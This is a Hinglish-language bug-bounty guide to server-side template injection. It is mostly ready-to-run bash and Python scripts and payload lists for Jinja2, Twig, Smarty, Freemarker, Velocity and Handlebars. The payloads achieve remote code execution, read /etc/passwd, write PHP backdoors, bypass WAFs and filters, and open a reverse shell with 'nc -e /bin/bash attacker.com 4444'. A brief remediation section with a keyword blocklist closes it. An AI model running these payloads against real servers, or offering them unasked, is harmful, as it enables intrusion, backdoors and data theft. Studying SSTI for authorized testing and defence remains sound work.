# 🔥 Template Injection (SSTI) Attacks - Elite Guide

## 🎯 Overview
Server-Side Template Injection (SSTI) ek high-impact vulnerability hai jo $1000-$10000 tak ke bugs dila sakti hai. Ye technique modern web frameworks mein RCE (Remote Code Execution) achieve karne ke liye use hoti hai.

## 🛠️ Tools Required
```bash
# Essential tools install karo
pip3 install requests jinja2 flask django
sudo apt install -y curl burpsuite
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# SSTI detection tools
git clone https://github.com/epinna/tplmap.git
cd tplmap && pip3 install -r requirements.txt

# Custom SSTI scanner
pip3 install ssti-scanner
```

## 🔍 Phase 1: Template Engine Detection

### Step 1: Basic SSTI Detection
```bash
#!/bin/bash
# Save as ssti_detect.sh

TARGET=$1
echo "🔍 Detecting SSTI vulnerabilities on $TARGET"

# Basic math expressions for detection
PAYLOADS=(
    "{{7*7}}"
    "${7*7}"
    "<%=7*7%>"
    "#{7*7}"
    "{{7*'7'}}"
    "${7*'7'}"
    "{{config}}"
    "{{self}}"
    "{{request}}"
)

echo "Testing basic SSTI payloads..."
for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    
    # GET request
    RESPONSE=$(curl -s "$TARGET/?name=$payload")
    if echo "$RESPONSE" | grep -q "49\|7777777"; then
        echo "🔥 POTENTIAL SSTI DETECTED with payload: $payload"
        echo "Response: $RESPONSE" | head -5
    fi
    
    # POST request
    RESPONSE=$(curl -s -X POST "$TARGET" -d "name=$payload")
    if echo "$RESPONSE" | grep -q "49\|7777777"; then
        echo "🔥 POTENTIAL SSTI DETECTED (POST) with payload: $payload"
    fi
done
```

### Step 2: Template Engine Fingerprinting
```python
#!/usr/bin/env python3
# Save as template_fingerprint.py

import requests
import sys

class TemplateFingerprinter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def detect_engine(self):
        print(f"🔍 Fingerprinting template engine for {self.target}")
        
        # Template engine specific payloads
        engines = {
            'Jinja2': [
                "{{config}}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
            ],
            'Twig': [
                "{{_self}}",
                "{{dump(app)}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
            ],
            'Smarty': [
                "{$smarty.version}",
                "{php}echo `id`;{/php}",
                "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',2)}"
            ],
            'Freemarker': [
                "${product.getClass()}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"
            ],
            'Velocity': [
                "$class.inspect($class.type)",
                "#set($str=$class.inspect('java.lang.String').type)",
                "#set($chr=$class.inspect('java.lang.Character').type)"
            ],
            'Handlebars': [
                "{{#with 'constructor'}}{{#with ../constructor}}{{#with 'constructor'}}{{#with ../constructor}}{{lookup . 'constructor'}}{{/with}}{{/with}}{{/with}}{{/with}}",
                "{{#with this as |obj|}}{{#with 'constructor' as |str|}}{{#with obj[str] as |foo|}}{{#with foo['prototype'] as |bar|}}{{#with bar['constructor'] as |baz|}}{{#with baz['constructor']('return process')() as |env|}}{{env['mainModule']['require']('child_process')['execSync']('id')}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}"
            ]
        }
        
        for engine, payloads in engines.items():
            print(f"
🎯 Testing {engine}...")
            for payload in payloads:
                if self.test_payload(payload, engine):
                    return engine
                    
        return "Unknown"
    
    def test_payload(self, payload, engine):
        try:
            # Test GET parameter
            response = self.session.get(f"{self.target}?name={payload}")
            
            # Check for engine-specific responses
            if engine == 'Jinja2' and ('flask' in response.text.lower() or 'jinja' in response.text.lower()):
                print(f"✅ {engine} detected!")
                return True
            elif engine == 'Twig' and 'twig' in response.text.lower():
                print(f"✅ {engine} detected!")
                return True
            elif engine == 'Smarty' and 'smarty' in response.text.lower():
                print(f"✅ {engine} detected!")
                return True
                
        except Exception as e:
            print(f"Error testing {engine}: {e}")
            
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 template_fingerprint.py https://target.com")
        sys.exit(1)
        
    target = sys.argv[1]
    fingerprinter = TemplateFingerprinter(target)
    engine = fingerprinter.detect_engine()
    print(f"
🎯 Detected template engine: {engine}")
```

## 💰 Phase 2: Jinja2 SSTI Exploitation ($2000+ Bugs)

### Technique 1: Basic Jinja2 RCE
```bash
# Jinja2 RCE payloads
echo "🔥 Jinja2 SSTI exploitation..."

# Basic config access
curl -s "$TARGET/?name={{config}}" | grep -i "secret\|key\|password"

# Class traversal for RCE
JINJA_PAYLOADS=(
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    "{{cycler.__init__.__globals__.os.popen('id').read()}}"
    "{{joiner.__init__.__globals__.os.popen('id').read()}}"
)

for payload in "${JINJA_PAYLOADS[@]}"; do
    echo "Testing Jinja2 payload: $payload"
    RESPONSE=$(curl -s "$TARGET/?name=$payload")
    if echo "$RESPONSE" | grep -q "uid=\|gid=\|root:"; then
        echo "🔥 RCE ACHIEVED with Jinja2!"
        echo "Response: $RESPONSE"
    fi
done
```

### Technique 2: Advanced Jinja2 Bypass
```python
#!/usr/bin/env python3
# Save as jinja2_advanced.py

import requests
import urllib.parse

class Jinja2Exploiter:
    def __init__(self, target):
        self.target = target
        
    def bypass_filters(self):
        print("🎯 Testing Jinja2 filter bypasses...")
        
        # Advanced bypass payloads
        bypasses = [
            # Attribute access bypass
            "{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()}}",
            
            # String concatenation bypass
            "{{''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('/etc/passwd').read()}}",
            
            # Unicode bypass
            "{{''['\u005f\u005fclass\u005f\u005f']['\u005f\u005fmro\u005f\u005f'][2]['\u005f\u005fsubclasses\u005f\u005f']()[40]('/etc/passwd').read()}}",
            
            # Hex encoding bypass
            "{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][2]['\x5f\x5fsubclasses\x5f\x5f']()[40]('/etc/passwd').read()}}",
            
            # Request args bypass
            "{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd').read()}}&a=__class__&b=__mro__&c=__subclasses__"
        ]
        
        for payload in bypasses:
            self.test_bypass(payload)
    
    def test_bypass(self, payload):
        try:
            encoded_payload = urllib.parse.quote(payload)
            response = requests.get(f"{self.target}?name={encoded_payload}")
            
            if "root:" in response.text or "uid=" in response.text:
                print(f"🔥 BYPASS SUCCESSFUL!")
                print(f"Payload: {payload}")
                print(f"Response snippet: {response.text[:200]}")
                
        except Exception as e:
            print(f"Error testing bypass: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 jinja2_advanced.py https://target.com")
        sys.exit(1)
        
    target = sys.argv[1]
    exploiter = Jinja2Exploiter(target)
    exploiter.bypass_filters()
```

## 🎪 Phase 3: Twig SSTI Exploitation ($1500+ Bugs)

### Technique 1: Twig RCE Payloads
```bash
# Twig SSTI exploitation
echo "🔥 Twig SSTI exploitation..."

# Basic Twig payloads
TWIG_PAYLOADS=(
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
    "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}"
    "{{_self.env.setCache('ftp://attacker.com:2121')}}{{_self.env.loadTemplate('backdoor')}}"
)

for payload in "${TWIG_PAYLOADS[@]}"; do
    echo "Testing Twig payload: $payload"
    RESPONSE=$(curl -s "$TARGET/?name=$payload")
    if echo "$RESPONSE" | grep -q "uid=\|gid="; then
        echo "🔥 TWIG RCE ACHIEVED!"
        echo "Response: $RESPONSE"
    fi
done

# Twig file write
echo "Testing Twig file write..."
curl -s "$TARGET/?name={{_self.env.registerUndefinedFilterCallback('file_put_contents')}}{{_self.env.getFilter('/tmp/backdoor.php', '<?php system(\$_GET[cmd]); ?>')}}"
```

### Technique 2: Twig Filter Bypass
```bash
# Advanced Twig bypass techniques
echo "🎯 Advanced Twig bypasses..."

# Map filter bypass
curl -s "$TARGET/?name={{['id']|map('system')|join}}"

# Reduce filter bypass  
curl -s "$TARGET/?name={{['id','']|reduce((carry, item) => carry ~ execute(item))}}"

# Custom filter registration
curl -s "$TARGET/?name={{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('whoami')}}"
```

## 🔧 Phase 4: Smarty SSTI Exploitation ($1000+ Bugs)

### Technique 1: Smarty RCE
```bash
# Smarty SSTI exploitation
echo "🔥 Smarty SSTI exploitation..."

# Basic Smarty RCE
SMARTY_PAYLOADS=(
    "{php}echo \`id\`;{/php}"
    "{php}system('id');{/php}"
    "{php}passthru('id');{/php}"
    "{Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,'<?php passthru(\$_GET[cmd]); ?>',2)}"
)

for payload in "${SMARTY_PAYLOADS[@]}"; do
    echo "Testing Smarty payload: $payload"
    RESPONSE=$(curl -s "$TARGET/?name=$payload")
    if echo "$RESPONSE" | grep -q "uid=\|gid="; then
        echo "🔥 SMARTY RCE ACHIEVED!"
        echo "Response: $RESPONSE"
    fi
done

# Smarty file inclusion
echo "Testing Smarty file inclusion..."
curl -s "$TARGET/?name={include file='/etc/passwd'}"
```

## 🚀 Phase 5: Freemarker SSTI Exploitation ($2000+ Bugs)

### Technique 1: Freemarker RCE
```bash
# Freemarker SSTI exploitation
echo "🔥 Freemarker SSTI exploitation..."

# Basic Freemarker RCE
FREEMARKER_PAYLOADS=(
    "<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('id')}"
    "<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>\${ex('java.lang.ProcessBuilder','id').start()}"
    "\${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"
)

for payload in "${FREEMARKER_PAYLOADS[@]}"; do
    echo "Testing Freemarker payload: $payload"
    RESPONSE=$(curl -s "$TARGET/?name=$payload")
    if echo "$RESPONSE" | grep -q "uid=\|gid=\|root:"; then
        echo "🔥 FREEMARKER RCE ACHIEVED!"
        echo "Response: $RESPONSE"
    fi
done
```

### Technique 2: Freemarker File Operations
```bash
# Freemarker file operations
echo "🎯 Freemarker file operations..."

# Read files
curl -s "$TARGET/?name=\${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('file:///etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"

# List directories
curl -s "$TARGET/?name=<#list '/etc'?children as child>\${child}</#list>"
```

## 🎪 Phase 6: Velocity SSTI Exploitation ($1500+ Bugs)

### Technique 1: Velocity RCE
```bash
# Velocity SSTI exploitation
echo "🔥 Velocity SSTI exploitation..."

# Velocity RCE payloads
VELOCITY_PAYLOADS=(
    "#set(\$str=\$class.inspect('java.lang.String').type)
#set(\$chr=\$class.inspect('java.lang.Character').type)
#set(\$ex=\$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))
\$ex.waitFor()
#set(\$out=\$ex.getInputStream())
#foreach(\$i in [1..\$out.available()])\$chr.valueOf(\$out.read())#end"

    "#set(\$engine=\$class.inspect('javax.script.ScriptEngineManager').type.newInstance().getEngineByName('JavaScript'))
\$engine.eval('java.lang.Runtime.getRuntime().exec("id")')"
)

for payload in "${VELOCITY_PAYLOADS[@]}"; do
    echo "Testing Velocity payload: $payload"
    RESPONSE=$(curl -s "$TARGET" -d "name=$payload")
    if echo "$RESPONSE" | grep -q "uid=\|gid="; then
        echo "🔥 VELOCITY RCE ACHIEVED!"
        echo "Response: $RESPONSE"
    fi
done
```

## 🔥 Phase 7: Automated SSTI Scanner

### Custom SSTI Scanner
```python
#!/usr/bin/env python3
# Save as elite_ssti_scanner.py

import requests
import re
import sys
import threading
from urllib.parse import quote

class EliteSSTIScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def scan_all_engines(self):
        print(f"🎯 Starting comprehensive SSTI scan on {self.target}")
        
        # Detection payloads for different engines
        detection_payloads = {
            'Math': ['{{7*7}}', '${7*7}', '<%=7*7%>', '#{7*7}'],
            'String': ['{{7*"7"}}', '${7*"7"}', '<%=7*"7"%>'],
            'Reflection': ['{{config}}', '${self}', '<%=request%>']
        }
        
        for category, payloads in detection_payloads.items():
            print(f"
🔍 Testing {category} payloads...")
            for payload in payloads:
                self.test_ssti_payload(payload, category)
        
        # If basic detection succeeds, try RCE
        if self.vulnerabilities:
            print("
🔥 SSTI detected! Attempting RCE...")
            self.attempt_rce()
    
    def test_ssti_payload(self, payload, category):
        try:
            # Test GET parameter
            response = self.session.get(f"{self.target}?test={quote(payload)}")
            
            # Check for mathematical evaluation
            if category == 'Math' and ('49' in response.text or '7777777' in response.text):
                print(f"✅ SSTI detected with payload: {payload}")
                self.vulnerabilities.append({
                    'payload': payload,
                    'method': 'GET',
                    'parameter': 'test',
                    'response': response.text[:200]
                })
            
            # Test POST data
            response = self.session.post(self.target, data={'test': payload})
            if category == 'Math' and ('49' in response.text or '7777777' in response.text):
                print(f"✅ SSTI detected (POST) with payload: {payload}")
                self.vulnerabilities.append({
                    'payload': payload,
                    'method': 'POST',
                    'parameter': 'test',
                    'response': response.text[:200]
                })
                
        except Exception as e:
            print(f"Error testing payload {payload}: {e}")
    
    def attempt_rce(self):
        # RCE payloads for different engines
        rce_payloads = [
            # Jinja2
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            
            # Smarty
            "{php}echo `id`;{/php}",
            
            # Freemarker
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            
            # Velocity
            "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex.waitFor()"
        ]
        
        for payload in rce_payloads:
            try:
                response = self.session.get(f"{self.target}?test={quote(payload)}")
                
                if re.search(r'uid=\d+|gid=\d+|root:', response.text):
                    print(f"🔥 RCE ACHIEVED!")
                    print(f"Payload: {payload}")
                    print(f"Response: {response.text[:500]}")
                    
                    # Save proof
                    with open('ssti_rce_proof.txt', 'w') as f:
                        f.write(f"Target: {self.target}
")
                        f.write(f"Payload: {payload}
")
                        f.write(f"Response: {response.text}
")
                    
                    return True
                    
            except Exception as e:
                print(f"Error testing RCE payload: {e}")
        
        return False
    
    def generate_report(self):
        if not self.vulnerabilities:
            print("❌ No SSTI vulnerabilities detected")
            return
            
        print(f"
📊 SSTI Scan Report for {self.target}")
        print("=" * 50)
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"
Vulnerability #{i}:")
            print(f"Payload: {vuln['payload']}")
            print(f"Method: {vuln['method']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Response snippet: {vuln['response']}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 elite_ssti_scanner.py https://target.com")
        sys.exit(1)
        
    target = sys.argv[1]
    scanner = EliteSSTIScanner(target)
    scanner.scan_all_engines()
    scanner.generate_report()
```

## 💡 Elite Pro Tips

### Advanced Bypass Techniques
```bash
# WAF bypass for SSTI
echo "🎪 Advanced SSTI WAF bypasses..."

# Encoding bypasses
curl -s "$TARGET/?name={{7*7}}" # Basic
curl -s "$TARGET/?name=%7B%7B7*7%7D%7D" # URL encoding
curl -s "$TARGET/?name={{7%2A7}}" # Partial encoding
curl -s "$TARGET/?name={{7/*comment*/7}}" # Comment injection

# Case variation
curl -s "$TARGET/?name={{Config}}" # Case change
curl -s "$TARGET/?name={{CONFIG}}" # All caps

# String concatenation
curl -s "$TARGET/?name={{'con'+'fig'}}" # String concat
curl -s "$TARGET/?name={{request['__cla'+'ss__']}}" # Attribute concat
```

### Blind SSTI Detection
```python
#!/usr/bin/env python3
# Save as blind_ssti_detector.py

import requests
import time

def detect_blind_ssti(target):
    print("🔍 Testing for blind SSTI...")
    
    # Time-based detection
    time_payloads = [
        "{{range(1000000)|list|length}}",  # Jinja2 time delay
        "{%for i in range(1000000)%}{%endfor%}",  # Jinja2 loop delay
        "<#list 1..1000000 as x>${x}</#list>",  # Freemarker delay
    ]
    
    for payload in time_payloads:
        start_time = time.time()
        
        try:
            response = requests.get(f"{target}?test={payload}", timeout=10)
            end_time = time.time()
            
            if end_time - start_time > 5:  # If response takes > 5 seconds
                print(f"🔥 Potential blind SSTI detected!")
                print(f"Payload: {payload}")
                print(f"Response time: {end_time - start_time:.2f} seconds")
                return True
                
        except requests.Timeout:
            print(f"🔥 Timeout detected - possible blind SSTI!")
            print(f"Payload: {payload}")
            return True
        except Exception as e:
            print(f"Error: {e}")
    
    return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 blind_ssti_detector.py https://target.com")
        sys.exit(1)
        
    target = sys.argv[1]
    detect_blind_ssti(target)
```

## 🎯 Real-World Exploitation Scenarios

### Scenario 1: Flask Application RCE
```bash
# Real-world Flask SSTI exploitation
echo "🌐 Flask application SSTI..."

# Step 1: Detect Jinja2
curl -s "$TARGET/profile?name={{config}}" | grep -i flask

# Step 2: Get RCE
curl -s "$TARGET/profile?name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}"

# Step 3: Establish reverse shell
curl -s "$TARGET/profile?name={{config.__class__.__init__.__globals__['os'].popen('nc -e /bin/bash attacker.com 4444').read()}}"
```

### Scenario 2: Email Template Injection
```bash
# Email template SSTI
echo "📧 Email template injection..."

# Test in email templates
curl -X POST "$TARGET/contact" -d "name={{7*7}}&email=test@test.com&message=test"

# If vulnerable, escalate to RCE
curl -X POST "$TARGET/contact" -d "name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&email=test@test.com&message=test"
```

## 📈 Impact Assessment

### Critical Impact ($5000+)
- Remote Code Execution on production servers
- Full system compromise
- Database access and data exfiltration
- Lateral movement in internal networks

### High Impact ($1000-5000)
- File system access (/etc/passwd, config files)
- Environment variable disclosure
- Internal service discovery
- Limited command execution

### Medium Impact ($500-1000)
- Template engine information disclosure
- Application configuration exposure
- Limited file read access

## 🛡️ Remediation Recommendations

### For Developers
```python
# Secure template usage examples
# Save as secure_templates.py

# ❌ Vulnerable code
def render_template_unsafe(user_input):
    template = Template(user_input)  # Never do this!
    return template.render()

# ✅ Secure code
def render_template_safe(user_data):
    template = Template("Hello {{ name }}!")  # Fixed template
    return template.render(name=user_data['name'])  # Controlled data

# ✅ Input validation
def validate_template_input(user_input):
    # Blacklist dangerous patterns
    dangerous_patterns = [
        'config', '__class__', '__mro__', '__subclasses__',
        'os.popen', 'subprocess', 'eval', 'exec'
    ]
    
    for pattern in dangerous_patterns:
        if pattern in user_input:
            raise ValueError(f"Dangerous pattern detected: {pattern}")
    
    return user_input
```

Yeh comprehensive SSTI guide hai jo tumhe $1000-$10000 tak ke bugs dila sakta hai! Har template engine ke liye specific techniques aur bypasses included hain. 🔥
